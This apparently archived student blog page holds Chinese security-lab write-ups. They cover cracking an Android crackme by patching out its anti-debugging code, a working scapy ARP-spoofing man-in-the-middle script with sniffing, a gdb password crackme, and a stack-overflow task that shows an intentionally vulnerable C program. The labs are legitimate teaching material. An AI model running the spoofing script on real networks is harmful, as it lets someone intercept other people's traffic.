@@ -1,0 +1,1745 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Imane&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Imane&#39;s Blog">
+<meta property="og:url" content="https://imane219.github.io/project/page/2/index.html">
+<meta property="og:site_name" content="Imane&#39;s Blog">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Imane">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/project/atom.xml" title="Imane&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/project/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/project/" id="logo">Imane&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/project/">Home</a>
+        
+          <a class="main-nav-link" href="/project/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/project/categories">Categories</a>
+        
+          <a class="main-nav-link" href="/project/tags">Tags</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/project/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://Imane219.github.io/project"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-逆向" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/04/18/%E9%80%86%E5%90%91/" class="article-date">
+  <time datetime="2021-04-18T06:09:01.000Z" itemprop="datePublished">2021-04-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E9%80%86%E5%90%91/">逆向</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/04/18/%E9%80%86%E5%90%91/">逆向</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="apk逆向分析实验"><a href="#apk逆向分析实验" class="headerlink" title="apk逆向分析实验"></a>apk逆向分析实验</h3><p><strong>1.</strong>   <strong>实验环境</strong></p>
+<p>(1) 逍遥模拟器；</p>
+<p>(2) AndroidKiller软件；</p>
+<p>(3) IDA Pro 7.0软件。</p>
+<p><strong>2.</strong>   <strong>实验内容</strong></p>
+<p>结合Android程序实例“Crackme_2.apk”，完成以下工作：</p>
+<p>（1）分析Android程序执行的过程，及核心代码的地址和范围；</p>
+<p>（2）程序中关键信息混淆的方法，并还原相关内容；</p>
+<p>（3）程序中反调试方法；</p>
+<p>（4）还原程序中被加密的代码，结合还原后的代码重新打包生成程序，并确保程序能够正常运行；</p>
+<p>（5）在上述工作基础上，获取实例代码中的“flag”，并进行验证。</p>
+<p><strong>3.</strong>   <strong>实验目标</strong></p>
+<p>(1 ) 借助于IDA工具，逆向实例程序，根据Android程序执行过程，定位核心代码；</p>
+<p>(2) 分析程序在初始化过程中，如何完成对关键信息的混淆，根据分析的结果，还原这些关键信息；</p>
+<p>(3) 分析程序中反调试的方法；</p>
+<p>(4) 借助于指令修改工具，去除反调试代码；</p>
+<p>(5) 通过静态分析方法，对核心代码进行还原;</p>
+<p>(6) 根据反编译的伪C代码，跟踪相关信息；</p>
+<p>(7) 以“flag”可能涉及到的变量为线索，跟踪“flag”相关的信息；</p>
+<p>尝试恢复“flag”。</p>
+<p><strong>4.</strong>   <strong>分析方法和过程</strong></p>
+<p>首先使用安卓模拟器打开需要破解的apk文件，Crackme_2.apk，如图所示：</p>
+<p><img src="apk1.png" alt="img"></p>
+<p>程序提示我们输入密码，随便输入“aaa”看它会出现什么提示，输入后显示“验证码校验失败”，如图所示：</p>
+<p><img src="apk2.png" alt="img"></p>
+<p>​    知道了错误输出之后，我们就可以去寻找对应的字符串了。将apk放入android killer中，android killer经过分析找到了程序的入口，点击即可进入，如图所示：</p>
+<p><img src="apk3.png" alt="img"></p>
+<p>​    使用搜索功能搜索“验证码”，但是没有找到相关的字符串，如图所示：</p>
+<p><img src="apk4.png" alt="img"></p>
+<p>​    我们尝试将main_activity.smali反编译，看看能不能看出点什么，如图所示，找到了错误字符串：</p>
+<p><img src="apk5.png" alt="img"></p>
+<p>​    仔细分析下图所示的反编译java代码，可以知道，第一个static块用于加载库文件crackme，这肯定是该程序实现的主要功能所在，可惜它并不在main_activity里面；第二个onCreate函数中间很多代码，我们不去管，仅仅看有“验证码校验失败”的部分，看到包含该字符串的方法命名为makeText，顾名思义，该方法用于创建“验证码校验失败”这个提示弹窗，那么激活这个创建弹窗的程序部分，才是我们所需要的；最后有一个native标识的securityCheck方法，native代表该方法并不是java内部所定义的，该方法是java调用一个非java代码的接口，根据这个名字我们猜测它的功能很重要。这样main_activity的分析就结束了，我们先去找crackme链接库。</p>
+<p><img src="apk6.png" alt="img"></p>
+<p>​    首先点击android killer的工程管理器，在lib文件夹中找到libcrackme.so库文件，如图所示:</p>
+<p><img src="apk7.png" alt="img"></p>
+<p>​    双击它发现全是乱码，如图所示，可知android killer不能解析.so文件，我们先将apk后缀改为zip，再用压缩工具将该apk解压，用ida pro打开.so文件。</p>
+<p><img src="apk8.png" alt="img"></p>
+<p>​    接着尝试在函数表中搜索crack，找到了包含crack的函数，如图所示，看名字应该就是我们所需要的。</p>
+<p><img src="apk9.png" alt="img"></p>
+<p>​    反汇编该代码，如图所示，可以看到变量命名可读性很差，但是有一个while循环函数，我们猜测它是用来字符串比对，仔细阅读可以发现，v7变量用于暂存v6字符串当前的值，接着将v7字符和v5地址处的字符串逐个比较，倘若不同则退出循环返回0，如果比对到最后都相同，并且v7 == 0（即到了字符串的末尾），则说明字符串比对成功，返回1.那么v6和v5两个地址必然一个指向我们需要的目标字符串，一个指向我们的输入字符串。我们可以看到，v6地址等于一个地址块首地址，点击它查看该处的字符串信息。</p>
+<p><img src="apk10.png" alt="img"></p>
+<p>​    进入后可以看到字符串“wojiushidaan”，如图所示，很显然这就是“我就是答案”的全拼，于是激动地将其输入，发现结果不对。可以反思自己的分析过程应该是没有错的，那么就只有可能这个函数并不是用来和真正的目标字符串比对的，这个“wojiushidaan”字符串是程序特地设计出来要迷惑我们的。</p>
+<p><img src="apk11.png" alt="img"></p>
+<p>​    那么此时静态分析已经黔驴技穷了，我们准备进行<strong>动态分析</strong>。</p>
+<p>​    首先做好动态分析的准备，下载adb（android debug bridge）工具，直接下载windows下的SDK Platform Tools到d盘，解压后可以看到里面有adb.exe，在该目录下打开终端，执行.\adb可以看到帮助选项。</p>
+<p>​    接着打开模拟器（我用的是逍遥模拟器），找到设备的版本号连点5次，打开开发者模式，于是就可以开启usb调试功能。接着查找逍遥模拟器的端口号是21503，输入命令adb connect 127.0.0.1:21503连接到该模拟器</p>
+<p>然后我们使用命令：adb connect 127.0.0.1:21503连接到该模拟器，从而可以进行动态调试，接着使用命令：adb devices查看已经连接的设备，可以看到已经成功连接至该模拟器，如图所示：</p>
+<p><img src="apk12.png" alt="img"></p>
+<p>​    接着我们到IDA pro的dbgsrv目录下找到android_server，用adb命令将其push 到Android的data/local/tmp目录下，使用命令：adb push，如图所示：</p>
+<p><img src="apk13.png" alt="img"></p>
+<p>​    接下来就可以使用adb shell命令进入安卓端的命令行，然后使用su命令提权，进入到/data/local/tmp目录下，给android_server赋予最高权限，输入命令：chmod 777 android_server，再输入命令：./an*，运行该server，监听端口，如图所示：</p>
+<p><img src="apk14.png" alt="img"></p>
+<p>​    别忘了还需要进行端口映射，再打开一个命令行，输入adb forward tcp:23946 tcp:23946，进行PC端和安卓端的端口映射，这样就可以开始动态调试了，如图所示：</p>
+<p><img src="apk15.png" alt="img"></p>
+<p>​    我们用IDA pro打开libcrackme.so文件，然后点击“Debugger”→“Switch Debugger”，选择“Remote ARM Linux/Android debugger”， 接着在Debugger Options中选择如图所示的选项：</p>
+<p><img src="apk16.png" alt="img"></p>
+<p>在“Process Options”里面将local host填为127.0.0.1，如图所示</p>
+<p><img src="apk17.png" alt="img"></p>
+<p>​    然后在模拟器中打开crackme程序，在IDA pro中“Debugger”中选择“Attach to process”准备调试安卓模拟器（手机端）中的进程,搜索“crackme”即可找到com.yaotong.crackme这个进程，点击进去开始动态运行，如图所示：</p>
+<p><img src="apk18.png" alt="img"></p>
+<p>​    但是十分遗憾，一点击这个进程，模拟器中的crackme程序就直接闪退掉了，这说明crackme程序本身可能对调试功能做了什么处理，增加了反调试功能。但是这也没关系，我们找到反调试部分将其用二进制编辑器去掉即可。</p>
+<p>​    结合课堂上讲的知识，我们知道反调试代码可能出现在.init_array和JNI_Onload中，首先进入init_array查看，打开view-&gt;open subviews-&gt;segements，找到init_array函数，如图所示：</p>
+<p><img src="apk19.png" alt="img"></p>
+<p>​    进去查看是初始化过程，并没有找到反调试相关信息,于是去找JNI_Onload函数,如图所示,在JNI_Onload函数中我们看到了一个可疑的大循环,但是仔细分析之后仍然什么都看不出来,只能找找其他的可以点击的函数名or地址块(变量名)来寻找可以分析的信息了。</p>
+<p><img src="apk20.png" alt="img"></p>
+<p>  我们发现下图1所示代码中的sub_16A4函数点开之后是比较明晰的C代码,如下图2所示:</p>
+<p><img src="apk21.png" alt="img"></p>
+<p><img src="apk22.png" alt="img"></p>
+<p>​    我们可以看到这个循环的循环体只是执行sub_130C函数,点进去看一看,又有一个大循环,虽然还是不明白循环的作用,但是找到了循环体的一个出口,如图所示,当v12&gt;=1就跳出该循环。我们猜测该循环是为了检测程序是否启动了调试，如果没有启动就一直检测，启动了就立即跳出循环退出。那么我们尝试将跳出循环部分删除,改成arm架构的空指令: 00 00 A0 E1。</p>
+<p><img src="apk23.png" alt="img"></p>
+<p>我们将修改过的.so文件替换原apk中的.so文件,利用android_killer重新打包成apk: 点击“Android”→“编译”，对该apk文件重新进行编译和签名。将新的apk文件放入模拟器中,删除原来的,再次执行adb连接等动态调试准备动作,用ida动态调试修改过的.so文件。</p>
+<p>进入crackme程序进程后，我们点击modules，在其中搜索crackme，找到libcrackme.so模块进程，如图所示： </p>
+<p><img src="apk24.png" alt="img"></p>
+<p>点击第一个，进入后可以看到该进程就两个功能函数，一个是我们开头分析过的main_activity，另一个是一个交jolin的函数，如图所示：</p>
+<p><img src="apk25.png" alt="img"></p>
+<p>我们知道libcrackme.so是实现程序功能的重要文件，那么其中除了main_activity，另外的函数肯定就是我们的功能函数，所以进入jolin看看，如图所示：</p>
+<p><img src="apk26.png" alt="img"></p>
+<p>​    点击TAB键将其反编译成c代码，替换其中的ascii码为字符，如图所示：</p>
+<p><img src="apk27.png" alt="img"></p>
+<p>​    已经胜利在望了，我们可以看到，目标字符串是“aiyo_,bu_uoo”，下划线处的字母很容易猜到是’u’和’c’，于是先将猜测的字符串输入程序中。</p>
+<p>​    输入“aiyou,bucuoo”，程序显示破解成功，如图所示：</p>
+<p><img src="apk28.png" alt="img"></p>
+<p><strong>5.</strong>   <strong>实验结论</strong></p>
+<p>本次实验难度比上次大很多，仅仅静态调试无法完成破解，因为程序加密了，于是进入动态调试。静态调试部分忧伤一个实验的基础，进行起来比较顺利，动态调试是从零开始，也遇到了许多困难，问了一些同学查找了很多资料，才慢慢地解决，最后完成破解。</p>
+<p>记录一下遇到的问题和解决方法：</p>
+<ol>
+<li><p>我一开始使用的模拟器是蓝叠模拟器，一直会遇到adb检测到两个devices的问题，在网上找了很多办法，包括更改adb的默认搜索端口，设置环境变量等等，都不起作用，最后用taskkill命令强制删除占用端口号的device，才能正常push android_server到模拟器中。</p>
+</li>
+<li><p>Push成功之后无法使用su功能给命令行提权，虽然使用chmod给android_server降低了权限，但是仅仅能执行它，却不能在ida中找到模拟器中的所有进程，只能找到手机终端的进程。搜索之后解决办法是使用adb root start-server以root权限打开start-server，但是打开后也并没有成功。无奈之下只能换一个模拟器重新开始。</p>
+</li>
+<li><p>换了逍遥模拟器之后，ida可以很顺利地attach进程，但是当我尝试在其中找JNI_Onload函数的时候却搜索不到。我去静态分析过程中找到JNI_Onload函数地偏移地址，再到动态分析中找到.so模块的基址，相加之后得到JNI_Onload的绝对地址，按G jmp过去后发现空空如也，没有代码。于是我只能另辟蹊径，点开.so模块，看看里面有些什么函数，比较出人意料的是只有两个函数，应该是因为什么原因ida没有将进程加载完全。但是仅根据已有的信息，已经能够破解字符串了。</p>
+</li>
+</ol>
+<p><strong>6.</strong>   <strong>实验心得</strong></p>
+<p>这次实验是我第一次接触安卓程序，也是第一次接触java代码，一开始上课听老师讲感觉一知半解的，破解过程似乎也很复杂，但是实验做完将其破解之后再回过头来卡课堂上讲的就很清晰易懂了。所以这也说明了通过此次实验我学到了很多东西，并且真正动手完成了一个比较复杂的程序的破解，感觉还是有一些成就感。</p>
+<p>另外一点感受就是逆向分析破解程序，可以有很多种方法去完成破解，当一种方法走不通可以尝试另一种方法，比如静态分析遇到了加密的代码可以用动态分析，找不到JNI_Onload可以不去找它，看看其他的函数等等。想要成功地完成逆向分析，一定要有不畏难的精神，撞到了南墙就换另一条路走；另外还需要对工具对代码结构足够地熟悉，这样才能在遇到困难时想到另一种方法去完成它。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/04/18/%E9%80%86%E5%90%91/" data-id="ckr5o9zzh002jxkurf5ixhpnz" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-scapy中间人攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/04/12/scapy%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" class="article-date">
+  <time datetime="2021-04-12T13:37:06.000Z" itemprop="datePublished">2021-04-12</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/04/12/scapy%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">scapy中间人攻击</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="scapy实现中间人攻击（ARP欺骗）"><a href="#scapy实现中间人攻击（ARP欺骗）" class="headerlink" title="scapy实现中间人攻击（ARP欺骗）"></a>scapy实现中间人攻击（ARP欺骗）</h3><p>Scapy 是一个强大的，用 Python 编写的交互式数据包处理程序，它能让用户发送、嗅探、 解析，以及伪造网络报文，从而用来侦测、扫描和向网络发动攻击。Scapy 可以轻松地处理 扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和 发现网络(network discorvery)之类的传统任务。它可以代替 hping，arpspoof，arp-sk，arping， p0f 甚至是部分的 Nmap，tcpdump 和 tshark（wireshark 的命令行工具）的功能。</p>
+<p>scapy中文文档：<a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/scapy-docs/content/">https://wizardforcel.gitbooks.io/scapy-docs/content/</a></p>
+<p>scapy中常用函数:</p>
+<table>
+<thead>
+<tr>
+<th align="left">命令</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">str(pkt)</td>
+<td>组装数据包</td>
+</tr>
+<tr>
+<td align="left">hexdump(pkt)</td>
+<td>十六进制转储</td>
+</tr>
+<tr>
+<td align="left">ls(pkt)</td>
+<td>显示出字段值的列表</td>
+</tr>
+<tr>
+<td align="left">pkt.summary()</td>
+<td>一行摘要</td>
+</tr>
+<tr>
+<td align="left">pkt.show()</td>
+<td>针对数据包的展开视图</td>
+</tr>
+<tr>
+<td align="left">pkt.show2()</td>
+<td>显示聚合的数据包(例如：计算好了校验和)</td>
+</tr>
+<tr>
+<td align="left">pkt.sprintf()</td>
+<td>用数据包字段填充格式字符串</td>
+</tr>
+<tr>
+<td align="left">pkt.decode_payload_as()</td>
+<td>改变payload的decode方式</td>
+</tr>
+<tr>
+<td align="left">pkt.psdump()</td>
+<td>绘制一个解释说明的PostScript图表</td>
+</tr>
+<tr>
+<td align="left">pkt.pdfdump()</td>
+<td>绘制一个解释说明的PDF</td>
+</tr>
+<tr>
+<td align="left">pkt.command()</td>
+<td>返回可以生成数据包的scapy命令</td>
+</tr>
+<tr>
+<td align="left">summary()</td>
+<td>显示一个关于每个数据包的摘要列表</td>
+</tr>
+<tr>
+<td align="left">nsummary()</td>
+<td>同上，但规定了数据包数量</td>
+</tr>
+<tr>
+<td align="left">conversations()</td>
+<td>显示一个会话图表</td>
+</tr>
+<tr>
+<td align="left">show()</td>
+<td>显示首选表示(通常用nsummary())</td>
+</tr>
+<tr>
+<td align="left">filter()</td>
+<td>返回一个$\lambda$过滤后的数据包列表</td>
+</tr>
+<tr>
+<td align="left">hexdump()</td>
+<td>返回所有数据包的一个hexdump</td>
+</tr>
+<tr>
+<td align="left">hexraw()</td>
+<td>返回所有数据包Raw layer 的hexdump</td>
+</tr>
+<tr>
+<td align="left">padding()</td>
+<td>返回一个带填充数据包的hexdump</td>
+</tr>
+<tr>
+<td align="left">nzpadding()</td>
+<td>返回一个具有非零填充的数据包的hexdump</td>
+</tr>
+<tr>
+<td align="left">plot()</td>
+<td>规划一个应用到数据包列表的$\lambda$函数</td>
+</tr>
+<tr>
+<td align="left">make table()</td>
+<td>根据$\lambda$函数来显示表格</td>
+</tr>
+</tbody></table>
+<p><strong>要求：</strong>利用scapy实现arp中间人攻击，实现对交换网络环境下主机的监听。</p>
+<ul>
+<li>scapy实现arp欺骗</li>
+<li>linux下路由转发开启</li>
+<li>使用监听软件监听</li>
+</ul>
+<p><strong>步骤：</strong></p>
+<p>选择kali作为实验环境，kali中本身带有scapy。</p>
+<ol>
+<li><p>首先使用<code>cat /proc/sys/net/ipv4/ip_forward</code>命令查看ip转发功能是否打开，如果返回的值为0说明没有打开禁止转发，为1反之。linux默认关闭ip转发功能，但是由于我们需要kali模拟网关，需要打开ip转发功能，使用命令<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>将1写入该文件中即可打开。</p>
+<blockquote>
+<p>注：上面的命令并没有保存对ip转发配置的更改，下次系统启动时仍会使用原来的值，要想永久修改IP转发，需要修改/etc/sysctl.conf文件，修 改下面一行的值： net.ipv4.ip_forward = 1 修改后可以重启系统来使修改生效，也可以执行下面的命令来使修改生效： sysctl -p /etc/sysctl.conf 。</p>
+</blockquote>
+</li>
+<li><p>接着编写python脚本实现arp欺骗，选择kali虚拟机作为攻击者，win10主机作为受害者，因此先找到主机ip和默认网关，可以通过扫描的方法发现。脚本的算法是不停地向受害主机和网关发送arp包，让网关以为kali虚拟机是与他通信的主机，让win10主机以为kali虚拟机是网关，因此可以截获双方发送的数据包。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8       #避免中文乱码</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p1 = ARP()</span><br><span class="line"><span class="comment">#被欺骗的主机ip</span></span><br><span class="line">p1.psrc = <span class="string">&quot;10.12.181.192&quot;</span></span><br><span class="line"><span class="comment">#网关ip</span></span><br><span class="line">p1.pdst = <span class="string">&quot;10.12.183.254&quot;</span></span><br><span class="line">p2 = ARP()</span><br><span class="line">p2.psrc = <span class="string">&quot;192.168.253.2&quot;</span></span><br><span class="line">p2.pdst = <span class="string">&quot;192.168.253.133&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qw</span>():</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">		time.sleep(<span class="number">0.8</span>)</span><br><span class="line">		send(p1)</span><br><span class="line"><span class="comment">#向目标发送欺骗包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qr</span>():</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">		time.sleep(<span class="number">0.8</span>)</span><br><span class="line">		send(p2)</span><br><span class="line"><span class="comment">#向网关发送欺骗包</span></span><br><span class="line">t1 = Thread(target = qw)</span><br><span class="line">t2 = Thread(target = qr)</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"><span class="comment">### python3 arp.py  注意使用python3，因为scapy包下载在python3的目录当中</span></span><br></pre></td></tr></table></figure></li>
+<li><p>用一个终端执行python脚本，另一个终端嗅探，使用scapy的sniff函数来实现嗅探。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = sniff()</span><br><span class="line">data.show()</span><br></pre></td></tr></table></figure></li>
+<li><p>在主机的cmd中ping百度，可以发现有一定的延迟，因为ping包被攻击者截获转发，需要消耗一定时间，接着查看嗅探的结果，可以看到成功抓取到了DNS查询包，以及ping包。</p>
+<p><img src="D:\0\blog\myblog\source_posts\计算机网络安全实验\scapy1.png" alt="scapy1"></p>
+</li>
+</ol>
+<p><strong>遇到的问题：</strong>一开始使用driftnet想要截获访问的百度图片，但是始终没有截获到，但是不转发的话可以将主机断网，猜测是driftnet无法识别https加密过的图片。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/04/12/scapy%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" data-id="ckr5o9zyj000ixkurfiqp5mtz" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/ARP/" rel="tag">ARP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/scapy/" rel="tag">scapy</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-信息系统安全" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/04/12/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" class="article-date">
+  <time datetime="2021-04-12T12:14:13.000Z" itemprop="datePublished">2021-04-12</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">信息系统安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/04/12/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">信息系统安全</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-gdb的初步使用"><a href="#1-gdb的初步使用" class="headerlink" title="1.gdb的初步使用"></a>1.gdb的初步使用</h3><p><strong>任务：</strong>使用gdb破解homework1程序</p>
+<p><strong>步骤：</strong></p>
+<ol>
+<li><p>使用32位ubuntu虚拟磁盘文件创建虚拟机</p>
+</li>
+<li><p>运行homework1程序查看程序的输入输出，可以发现当随便输入字符串的时候会提示:(，如图，根据经验可猜测逆向破解出正确的字符串之后可以得到正确输出。</p>
+<p><img src="%5C%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework11.png" alt="homework11"></p>
+</li>
+<li><p>使用gdb调试该程序，使用<code>info functions</code>指令来列出该程序调用了哪些函数，说不定可以从函数调用中获得信息，如图，可以看到一个<code>strcmp</code>函数，很明显它是为了和正确的字符串做比对。</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework12.png" alt="homework12"></p>
+</li>
+<li><p>我们还是进入main函数，对其反汇编查看代码，如图，可以看到<code>strcmp</code>函数之前有一个<code>puts</code>函数和一个<code>gets</code>函数的调用，很显然<code>puts</code>函数是为了输出提示信息，也就是一开始看到的 <em>this is homework1</em>，<code>gets</code>函数是为了得到我们的输入。我们知道<code>strcmp</code>函数需要两个参数，一个是待比对字符串首地址，一个是目标字符串首地址；查看汇编代码我们可以看到<code>strcmp</code>调用之前<code>push</code>了两个值，一个是常数<strong>0x8048622</strong>，一个是<strong>eax</strong>（即ebp-0x70）。而在gets函数前我们可以看到也push了同样值的eax，很容易得出结论eax所指地址就是存放我们输入字符串的首地址，那么常数处就存放着我们的目标地址。</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework13.png" alt="homework12"></p>
+</li>
+<li><p>使用指令<code>x\1s 0x8048622</code>命令查看该地址处的内存信息，其中x是查看内存信息的指令，1代表长度位1，s指定输出格式为字符串，如图，得到了我们的flag：<strong>home@work@1</strong></p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework14.png" alt="homework12"></p>
+</li>
+<li><p>再次执行homework1程序，输入破解出来的字符串，得到输入正确提示符ok，如图所示：</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework15.png" alt="homework12"></p>
+</li>
+</ol>
+<h3 id="2-栈溢出攻击小试"><a href="#2-栈溢出攻击小试" class="headerlink" title="2.栈溢出攻击小试"></a>2.栈溢出攻击小试</h3><p><strong>任务：</strong>利用return2libc或rop攻击，编写exploit程序来构建恶意输入文件，攻击目标为运行shell</p>
+<p>有缓冲区溢出漏洞的程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulfunc</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">25</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">500</span>];</span><br><span class="line">	FILE *badfile;</span><br><span class="line"></span><br><span class="line">	badfile = fopen(<span class="string">&quot;badfile&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">400</span>, badfile);</span><br><span class="line">	vulfunc(str);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Returned properly\n&quot;</span>);</span><br><span class="line">	fclose(badfile);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>平台：</strong>32位seed虚拟机</p>
